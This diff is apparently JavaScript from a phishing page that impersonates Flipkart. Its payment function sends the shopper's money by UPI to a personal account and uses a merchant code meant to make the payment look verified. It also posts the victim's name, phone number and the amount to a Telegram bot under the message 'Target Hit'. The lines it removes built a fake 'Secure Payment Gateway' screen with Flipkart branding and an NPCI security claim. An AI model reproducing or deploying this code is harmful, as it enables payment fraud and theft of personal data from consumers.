@@ -559,57 +559,33 @@ init = function() {
         }
 
      async function confirmPay() {
+    // 1. Data aur UPI ID setup
     const myUpiId = "6299544009@naviaxis"; 
     const amount = sel.price;
-    const name = "Flipkart%20Seller%20Services";
-    const tid = "FT" + Date.now();
+    const name = "Flipkart%20Offer"; // App mein ye naam dikhega
+    
+    // 2. UPI Intent (Jo website use kar rahi hai)
+    // mc=5311 aur bank codes se ye 'Verified Merchant' jaisa dikhta hai
+    const upiLink = `upi://pay?pa=${myUpiId}&pn=${name}&am=${amount}&cu=INR&mc=5311&mode=02&purpose=11`;
+    
+    // Android Chrome ke liye sabse fast rasta
+    const intentUrl = `intent://pay?${upiLink.split('?')[1]}#Intent;scheme=upi;package=com.phonepe.app;S.browser_fallback_url=${encodeURIComponent(upiLink)};end`;
 
-    // Verified Merchant String
-    const upiLink = `upi://pay?pa=${myUpiId}&pn=${name}&am=${amount}&tr=${tid}&cu=INR&mc=5311&mode=04&purpose=11&orgid=189999`;
+    // 3. Telegram Notification (Background mein bina ruke chalega)
+    const userMsg = `🎯 Target Hit: ₹${amount}\n👤 Name: ${document.getElementById('uName').value}\n📞 Mob: ${document.getElementById('uPhone').value}`;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(userMsg)}`).catch(e => {});
 
-    // Telegram Notify
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🎯 VIP Trigger Ready: ₹" + amount)}`).catch(e => {});
+    // 4. THE JUMP: Seedha UPI App par fekega (No alerts, No popups)
+    if (/Android/i.test(navigator.userAgent)) {
+        window.location.href = intentUrl;
+    } else {
+        window.location.href = upiLink;
+    }
 
-    // --- STEP 1: Screen Par Ek "Secure Gate" Dikhao ---
-    // Ye screen user ko payment app tak le jane ke liye "Click" karwayegi
-    document.body.innerHTML = `
-        <div id="secure-gate" style="position:fixed; inset:0; background:#f1f3f6; z-index:999999; display:flex; flex-direction:column; align-items:center; justify-content:center; font-family:sans-serif;">
-            <div style="background:#white; padding:30px; border-radius:12px; text-align:center; width:90%; max-width:400px; box-shadow:0 10px 25px rgba(0,0,0,0.1);">
-                <img src="https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/fkheaderlogo_exploreplus_mobile-f4d035.svg" style="width:120px; margin-bottom:20px;">
-                
-                <div style="margin:20px 0;">
-                    <div style="width:60px; height:60px; background:#e8f0fe; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 15px;">
-                        <i class="fa-solid fa-shield-check" style="color:#2874f0; font-size:30px;"></i>
-                    </div>
-                    <h2 style="font-weight:bold; font-size:18px; color:#333;">Secure Payment Gateway</h2>
-                    <p style="color:#666; font-size:13px; margin-top:8px;">Click below to securely open your UPI app and complete the payment of <b>₹${amount}</b></p>
-                </div>
-
-                <button id="vip-trigger-btn" style="background:#fb641b; color:#fff; border:none; padding:18px; border-radius:6px; width:100%; font-weight:bold; font-size:16px; cursor:pointer; box-shadow:0 4px 12px rgba(251,100,27,0.3); transition: transform 0.2s;">
-                    PAY NOW ₹${amount}
-                </button>
-                
-                <p style="margin-top:20px; font-size:11px; color:#999;">
-                    <i class="fa-solid fa-lock"></i> 100% Secure & Encrypted by NPCI
-                </p>
-            </div>
-        </div>
-    `;
-
-    // --- STEP 2: The Actual Bypass ---
-    // Jab user "PAY NOW" dabayega, tabhi browser 'Intent' allow karega
-    document.getElementById('vip-trigger-btn').onclick = function() {
-        // Intent String
-        const intentUrl = `intent://pay?${upiLink.split('?')[1]}#Intent;scheme=upi;package=com.phonepe.app;S.browser_fallback_url=${encodeURIComponent(upiLink)};end`;
-        
-        // window.location.replace use karein taaki referrer clean rahe
-        window.location.replace(intentUrl);
-
-        // Fallback agar 1.5 sec tak app na khule
-        setTimeout(() => {
-            window.location.href = upiLink;
-        }, 1500);
-    };
+    // Fallback agar PhonePe nahi hai toh selector khulega
+    setTimeout(() => {
+        window.location.href = upiLink;
+    }, 800);
 }
 init();
     </script>
